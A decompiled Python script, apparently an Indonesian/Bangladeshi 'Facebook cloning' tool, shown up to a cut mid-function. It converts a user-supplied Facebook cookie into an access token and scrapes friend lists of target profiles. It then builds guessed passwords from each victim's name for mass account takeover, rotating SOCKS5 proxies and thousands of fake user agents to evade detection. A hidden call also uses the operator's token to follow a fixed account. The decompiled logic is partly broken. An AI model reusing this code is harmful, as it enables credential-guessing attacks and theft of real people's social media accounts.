#DECODED BY @ddfmoto0 

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from string import *
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
open('proxy.txt', 'w').write(prox)
if Exception:
    e = None
    print('Jaringan Internet Anda Bermasalah......')
    e = None
    del e
    e = None
    del e
prox = open('proxy.txt', 'r').read().splitlines()
ugen = []
for agenku in range(10000):
    rr = random.randint
    rc = random.choice
    bek1 = f'''Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek1)
    bek2 = f'''Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek2)
    bek3 = f'''Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek3)
    bek4 = f'''Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek4)
    bek5 = f'''Mozilla/5.0 (Linux; Android 8.1.0; A95X MAX) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek5)
    bek6 = f'''Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek6)
    bek7 = f'''Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek7)
    bek8 = f'''Mozilla/5.0 (Linux; Android 7.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek8)
    bek9 = f'''Mozilla/5.0 (Linux; Android 5.0.1; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek9)
    bek10 = f'''Mozilla/5.0 (Linux; Android 8.1.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek10)
    bek11 = f'''Mozilla/5.0 (Linux; Android 9.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek11)
    bek12 = f'''Mozilla/5.0 (Linux; Android 13; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek12)
    bek13 = 'Mozilla/5.0 (Linux; Android 10; SM-W2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 EdgA/81.0.416.81'
    ugen.append(bek13)
    bek14 = 'Mozilla/5.0 (Linux; Android 13; SM-A055F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36'
    ugen.append(bek14)
    bek15 = 'Well /5.0 (Linux; Android 5; Samsung Chrome 11 (3180) Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.464.442 Tokhs/537.36'
    ugen.append(bek15)
    bek16 = f'''Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek16)
    bek17 = f'''Mozilla/5.0 (Linux; Android 12; SM-M536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek17)
    bek18 = f'''Mozilla/5.0 (Linux; Android 12; moto g41) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek18)
    bek19 = f'''Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS9CUE5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek19)
    bek20 = f'''Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M346B1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek20)
    bek22 = f'''Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(94, 119))}.0.0.0 Mobile Safari/537.36'''
    ugen.append(bek22)
    bek21 = f'''Mozilla/5.0 (Linux; Android 9; SAMSUNG TicWatch Pro 3 Ultra GPS) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek21)
    bek22 = f'''Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))} SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek22)
    bek23 = f'''Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek23)
    bek24 = f'''Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek24)
    bek25 = f'''Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG OW20W2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 30))}.0 Chrome/{str(rr(10, 190))}.0.{str(rr(1000, 6000))}.{str(rr(10, 290))} Mobile Safari/537.36'''
    ugen.append(bek25)
    (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, idf, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
    cokbrut = []
    ses = requests.Session()
    princp = []
    wa = sol()
    pwpluss = []
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m'
    O = '\x1b[1;96m'
    N = '\x1b[0m'
    Z = '\x1b[1;30m'
    sir = '\x1b[41m\x1b[1;97m'
    x = '\x1b[m'
    m = '\x1b[1;91m'
    k = '\x1b[93m'
    h = '\x1b[1;92m'
    hh = '\x1b[32m'
    u = '\x1b[95m'
    kk = '\x1b[33m'
    b = '\x1b[1;96m'
    p = '\x1b[0;34m'
    asu = random.choice([
        m,
        k,
        h,
        u,
        b])
    dic = {
        '1': 'January',
        '2': 'February',
        '3': 'March',
        '4': 'April',
        '5': 'May',
        '6': 'June',
        '7': 'July',
        '8': 'August',
        '9': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'December' }
    dic2 = {
        '01': 'January',
        '02': 'February',
        '03': 'March',
        '04': 'April',
        '05': 'May',
        '06': 'June',
        '07': 'July',
        '08': 'August',
        '09': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'Devember' }
    tgl = datetime.datetime.now().day
    bln = dic[str(datetime.datetime.now().month)]
    thn = datetime.datetime.now().year
    okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    
    def perjalanan(u):
        for e in u + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.005)
            return None

    
    def clear():
        os.system('clear')

    
    def back():
        menu()

    logo = '\n\x1b[1;32m\n░█████╗░██╗░░░██╗██████╗░███████╗██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗\n██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝\n██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗\n╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║\n░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝\n\x1b[38;5;46m==================================================\n  \x1b[1;91m[\x1b[1;35m\x1a\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN\n  \x1b[1;91m[\x1b[1;35m\x1a\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mPUBLIC CLONING\n  \x1b[1;91m[\x1b[1;35m\x1a\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92mPRO\n\x1b[38;5;46m==================================================\n'
    
    def login():
        token = open('.listrik.txt', 'r').read()
        cok = open('.kueh.txt', 'r').read()
        tokenku.append(token)
        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies = {
            'cookie': cok })
        sy2 = json.loads(sy.text)['name']
        sy3 = json.loads(sy.text)['id']
        menu(sy2, sy3)
        return None
        if KeyError:
            login_lagi334()
            return None
        if None.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style = 'red')
            sol().print(lo, style = 'cyan')
            exit()
            return None
        if IOError:
            login_lagi334()
            return None

    
    def login_lagi334():
        asu = random.choice([
            m,
            k,
            h,
            b,
            u])
        os.system('clear')
        print(logo)
        cookie = input(f'''\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mCOOKIE :{asu} ''')
        open('.kueh.txt', 'w').write(cookie)
        rsn = requests.Session()
        rsn.headers.update({
            'Accept-Language': 'id,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Referer': 'https://www.instagram.com/',
            'Host': 'www.facebook.com',
            'Sec-Fetch-Mode': 'cors',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Dest': 'empty',
            'Origin': 'https://www.instagram.com',
            'Accept-Encoding': 'gzip, deflate' })
        response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {
            'cookie': cookie })
        if '"access_token":' in str(response.headers):
            token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            open('.listrik.txt', 'w').write(token)
            print(f'''{h!s}Login Succes{p!s}''')
        print(f'''{m!s}Failled Get Token{p!s}''')
        print('Failled Get Token')
        None(None, None)
        if not None:
            pass
        print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mRUN AGAIN ')
        time.sleep(1)
        exit()
        return None
        if Exception:
            e = None
            os.system('rm -f .listrik.txt')
            os.system('rm -f .kueh.txt')
            print('  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s' % (x, k, x, m, x))
            print(e)
            exit()
            e = None
            del e
            return None
        e = None
        del e

    
    def bot():
        requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)
        return None

    
    def menu(my_id, my_name):
        token = open('.listrik.txt', 'r').read()
        cok = open('.kueh.txt', 'r').read()
        if IOError:
            print('[×] Cookies Kadaluarsa ')
            time.sleep(5)
            login_lagi334()
        os.system('clear')
        print(logo)
        print('\x1b[1;31m[\x1b[1;96m1\x1b[1;31m] \x1b[1;33mPUBLIC CLONE')
        print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;31mEXIT')
        print('\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=')
        mek = input('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;31mChoose : \x1b[1;92m')
        if mek in ('1', '01'):
            massal()
            return None
        None()

    
    def massal():
        token = open('.listrik.txt', 'r').read()
        cok = open('.kueh.txt', 'r').read()
        if IOError:
            print(f'''{m}cookies telah kadaluarsa ster''')
            exit()
        print('')
        dwi = int(input('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mPUBLIC ID LIMIT : '))
        if ValueError:
            exit()
        if dwi < 1 or dwi > 1000:
            exit()
        ses = requests.Session()
        _dwi_ = 0
        for yantti in range(dwi):
            _dwi_ += 1
            os.system('clear')
            print(logo)
            Masukan = input(f'''\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;32mINPUT PUBLIC ID {_dwi_}\n\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mINPUT ID : ''')
            idf.append(Masukan)
            for user in idf:
                head = {
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' }
                if len(id) == 0:
                    params = {
                        'access_token': token,
                        'fields': 'friends' }
                params = {
                    'access_token': token,
                    'fields': 'friends' }
                url = requests.get('https://graph.facebook.com/{}'.format(user), params = params, headers = head, cookies = {
                    'cookies': cok }).json()
                for proses in url['friends']['data']:
                    woy = proses['id'] + '|' + proses['name']
                    if woy in id:
                        pass
                    id.append(woy)
                    if (KeyError, IOError):
                        pass
                if requests.exceptions.ConnectionError:
                    exit()
                setting()
                return None
                if requests.exceptions.ConnectionError:
                    print(f''' {P}{M}  koneksi terputus''')
                    exit()
                    return None
                if (None, IOError):
                    print(f''' {P}{M}  teman tidak publik''')
                    exit()
                    return None

    
    def setting():
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
            passwrd()
            return None

    
    def passwrd():
        print(f'''''')
        os.system('clear')
        print(logo)
        print('\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=')
        print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;96mSHOHAG-KHAN IS A BRAND')
        print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mCYBER-ARMY TOTAL ID GALLERY: ' + str(len(id)))
        print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;96mPLAY AIRPLANE MODE EVERY 500 IDZ')
        print('\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=\x1b[1;32m=')
        pool = tred(max_workers = 30)
        for yuzong in id2:
            nmf = yuzong.split('|')[1].lower()
            idf = yuzong.split('|')[0]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                pwv.append(frs + '12')
                pwv.append(frs + '123')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456')
                pwv.append(frs + '123@')
                pwv.append(frs + '654321')
                pwv.append(frs + '54321')
                pwv.append(frs + '4321')
                pwv.append(frs + '321')
                pwv.append(frs + '@')
                pwv.append(frs + '@@')
                pwv.append(frs + '@@@')
                pwv.append(frs + '@#')
                pwv.append(frs + '11')
                pwv.append(frs + '1122')
                pwv.append(frs + '112233')
                pwv.append(frs + '11223344')
                pwv.append(frs + '00')
                pwv.append(frs + '000')
                pwv.append(frs + '0000')
                pwv.append(frs + '1998')
                pwv.append(frs + '1999')
                pwv.append(frs + '2000')
                pwv.append(frs + '2001')
                pwv.append(frs + '2002')
                pwv.append(frs + '2003')
                pwv.append(frs + '2021')
                pwv.append(frs + '2023')
                pwv.append(frs + '2022')
                pwv.append(frs + '2024')
            if len(frs) < 3:
                pwv.append(nmf)
            pwv.append(nmf)
            pwv.append(frs + '12')
            pwv.append(frs + '123')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
            pwv.append(frs + '123456')
            pwv.append(frs + '123@')
            pwv.append(frs + '321')
            pwv.append(frs + '4321')
            pwv.append(frs + '54321')
            pwv.append(frs + '654321')
            pwv.append(frs + '@')
            pwv.append(frs + '@@')
            pwv.append(frs + '@@@')
            pwv.append(frs + '@#')
            pwv.append(frs + '11')
            pwv.append(frs + '1122')
            pwv.append(frs + '112233')
            pwv.append